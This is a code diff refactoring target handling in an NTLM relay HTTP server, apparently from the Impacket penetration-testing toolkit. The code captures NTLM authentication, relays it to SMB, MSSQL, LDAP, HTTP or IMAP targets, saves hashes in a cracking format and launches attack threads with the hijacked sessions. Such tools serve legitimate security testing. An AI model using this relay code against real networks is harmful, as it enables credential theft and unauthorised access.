@@ -48,9 +48,9 @@ class HTTPRelayServer(Thread):
             if self.server.config.mode != 'REDIRECT':
                 if self.server.config.target is None:
                     # Reflection mode, defaults to SMB at the target, for now
-                    self.server.config.target = TargetsProcessor(singletarget = 'SMB://%s:445/' % client_address[0])
-                self.target = self.server.config.target.get_target(client_address[0],self.server.config.randomtargets)
-                LOG.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.target[1]))
+                    self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
+                self.target = self.server.config.target.getTarget(self.server.config.randomtargets)
+                LOG.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.target.hostname))
             try:
                 SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
             except Exception, e:
@@ -128,20 +128,20 @@ class HTTPRelayServer(Thread):
             if messageType == 1:
                 if not self.do_ntlm_negotiate(token):
                     #Connection failed
-                    self.server.config.target.log_target(self.client_address[0],self.target)
+                    self.server.config.target.logTarget(self.target)
                     self.do_REDIRECT()
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
 
                 if not self.do_ntlm_auth(token,authenticateMessage):
-                    LOG.error("Authenticating against %s as %s\%s FAILED" % (
-                        self.target, authenticateMessage['domain_name'].decode('utf-16le'),
+                    LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
+                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
                         authenticateMessage['user_name'].decode('utf-16le')))
 
                     # Only skip to next if the login actually failed, not if it was just anonymous login or a system account which we don't want
                     if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
-                        self.server.config.target.log_target(self.client_address[0],self.target)
+                        self.server.config.target.logTarget(self.target)
                         # No anonymous login, go to next host and avoid triggering a popup
                         self.do_REDIRECT()
                     else:
@@ -149,8 +149,8 @@ class HTTPRelayServer(Thread):
                         self.do_AUTHHEAD('NTLM')
                 else:
                     # Relay worked, do whatever we want here...
-                    LOG.info("Authenticating against %s as %s\%s SUCCEED" % (
-                        self.target, authenticateMessage['domain_name'].decode('utf-16le'),
+                    LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
+                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'].decode('utf-16le'),
                         authenticateMessage['user_name'].decode('utf-16le')))
 
                     ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
@@ -162,7 +162,7 @@ class HTTPRelayServer(Thread):
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
 
-                    self.server.config.target.log_target(self.client_address[0],self.target)
+                    self.server.config.target.logTarget(self.target)
 
                     self.do_attack()
 
@@ -176,12 +176,12 @@ class HTTPRelayServer(Thread):
             return 
 
         def do_ntlm_negotiate(self,token):
-            if self.server.config.protocolClients.has_key(self.target[0]):
-                self.client = self.server.config.protocolClients[self.target[0]](self.server.config, self.target[1])
+            if self.server.config.protocolClients.has_key(self.target.scheme.upper()):
+                self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target.hostname)
                 self.client.initConnection()
                 self.challengeMessage = self.client.sendNegotiate(token)
             else:
-                LOG.error('Protocol Client for %s not found!' % self.target[0])
+                LOG.error('Protocol Client for %s not found!' % self.target.scheme.upper())
 
             #Calculate auth
             self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.challengeMessage.getData()))
@@ -192,7 +192,7 @@ class HTTPRelayServer(Thread):
             self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                         authenticateMessage['user_name'].decode('utf-16le'))).upper()
 
-            if authenticateMessage['user_name'] != '' or self.target[1] == '127.0.0.1':
+            if authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
                 clientResponse, errorCode = self.client.sendAuth(token)
             else:
                 # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
@@ -205,25 +205,25 @@ class HTTPRelayServer(Thread):
             return False
 
         def do_attack(self):
-            if self.target[0] == 'SMB' or self.target[0] == 'MSSQL':
+            if self.target.scheme.upper() == 'SMB' or self.target.scheme.upper() == 'MSSQL':
                 if self.server.config.runSocks is True:
                     # For now, we only support SOCKS for SMB/MSSQL, for now.
                     # Pass all the data to the socksplugins proxy
-                    activeConnections.put((self.target[1], self.client.targetPort, self.authUser, self.client.session, self.client.sessionData))
-                elif self.target[0] == 'MSSQL':
+                    activeConnections.put((self.target.hostname, self.client.targetPort, self.authUser, self.client.session, self.client.sessionData))
+                elif self.target.scheme.upper() == 'MSSQL':
                     clientThread = self.server.config.attacks['MSSQL'](self.server.config, self.client.session)
                     clientThread.start()
                 else:
                     clientThread = self.server.config.attacks['SMB'](self.server.config, self.client.session, self.authUser)
                     clientThread.start()
 
-            if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
+            if self.target.scheme.upper() == 'LDAP' or self.target.scheme.upper() == 'LDAPS':
                 clientThread = self.server.config.attacks['LDAP'](self.server.config, self.client.session, self.authUser)
                 clientThread.start()
-            if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
+            if self.target.scheme.upper() == 'HTTP' or self.target.scheme.upper() == 'HTTPS':
                 clientThread = self.server.config.attacks['HTTP'](self.server.config, self.client.session, self.authUser)
                 clientThread.start()
-            if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
+            if self.target.scheme.upper() == 'IMAP' or self.target.scheme.upper() == 'IMAPS':
                 clientThread = self.server.config.attacks['IMAP'](self.server.config, self.client.session, self.authUser)
                 clientThread.start()
 
